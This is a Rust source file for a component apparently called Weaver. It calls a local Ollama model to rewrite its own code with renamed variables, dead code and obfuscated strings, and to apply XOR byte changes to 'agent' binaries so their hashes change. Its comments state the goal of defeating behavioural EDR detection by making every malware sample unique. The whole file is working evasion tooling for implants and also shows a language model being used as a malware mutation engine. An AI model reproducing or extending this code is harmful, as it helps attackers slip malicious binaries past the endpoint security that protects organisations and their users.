// ReactiveLLM: Weaver uses local Ollama to rewrite code in real-time.
// Every N hours, the Weaver sends its own source to the LLM and
// receives a semantically-equivalent but structurally different version.
// This defeats behavioral EDR detection — every sample is unique.

use std::process::Command;
use tracing::info;

/// Request Ollama to rewrite a code snippet with different variable names,
/// reordered functions, and different control flow — same logic.
pub fn llm_rewrite(code_snippet: &str, language: &str) -> Option<String> {
    let prompt = format!(
        "[INST] Rewrite this {} code. Keep the exact same functionality but:\n\
         1. Change ALL variable names\n\
         2. Reorder independent statements\n\
         3. Change loop structures (for->while, while->loop)\n\
         4. Inline or extract functions\n\
         5. Add dead code blocks that never execute\n\
         6. Change string literals to obfuscated versions\n\
         Return ONLY the rewritten code, no explanation.\n\n{} [/INST]",
        language, code_snippet
    );

    match Command::new("ollama")
        .args(["run", "codellama:7b", &prompt])
        .output()
    {
        Ok(out) => {
            let response = String::from_utf8_lossy(&out.stdout).to_string();
            if response.is_empty() || response.contains("error") {
                // Fallback: try smaller model
                let out2 = Command::new("ollama")
                    .args(["run", "tinyllama", &prompt])
                    .output()
                    .ok()?;
                let r2 = String::from_utf8_lossy(&out2.stdout).to_string();
                if r2.len() > 50 { return Some(r2); }
                return None;
            }
            Some(response)
        }
        Err(_) => None,
    }
}

/// Mutate an agent binary using LLM-guided byte-level changes.
/// The LLM suggests which sections to modify and the Weaver applies them.
pub fn llm_mutate_binary(binary: &[u8], agent_name: &str) -> Option<Vec<u8>> {
    let _header = binary.get(..4096)?;
    let body = binary.get(4096..)?;

    let prompt = format!(
        "[INST] You are a binary mutation engine. Given a {} byte {} binary,\n\
         suggest 3 safe byte-level mutations (XOR positions) that change the hash\n\
         but keep the binary functional. Skip the first 4096 bytes (header).\n\
         Respond: pos1:byte1,pos2:byte2,pos3:byte3 [/INST]",
        binary.len(), agent_name
    );

    let response = match Command::new("ollama")
        .args(["run", "tinyllama", &prompt])
        .output()
    {
        Ok(out) => String::from_utf8_lossy(&out.stdout).to_string(),
        Err(_) => return None,
    };

    let mut mutated = binary.to_vec();
    for part in response.split(',') {
        let parts: Vec<&str> = part.split(':').collect();
        if parts.len() == 2 {
            if let (Ok(pos), Ok(byte)) = (parts[0].trim().parse::<usize>(), u8::from_str_radix(parts[1].trim(), 16)) {
                let idx = 4096 + (pos % body.len());
                if idx < mutated.len() {
                    mutated[idx] ^= byte;
                }
            }
        }
    }

    if mutated == binary {
        None // No changes applied
    } else {
        info!("LLM_MUTATE: {} bytes mutated in {}", 
            mutated.iter().zip(binary.iter()).filter(|(a,b)| a!=b).count(), agent_name);
        Some(mutated)
    }
}

/// Full reactive obfuscation cycle: rewrite source → compile variant.
/// In production, the Weaver would recompile itself with the new source.
pub fn reactive_cycle(interval_hours: u64) {
    info!("REACTIVE_LLM: cycle started (interval: {}h)", interval_hours);
    // In production: read own source, rewrite, compile, replace running binary
    // For now: log intent
    info!("REACTIVE_LLM: would rewrite Weaver source via Ollama codellama:7b");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_llm_mutate_no_ollama() {
        // Should gracefully return None when Ollama is not running
        let data = vec![0x41u8; 10000];
        let result = llm_mutate_binary(&data, "test");
        // Ollama not running = None is acceptable
        assert!(result.is_none() || result.unwrap().len() == data.len());
    }
}
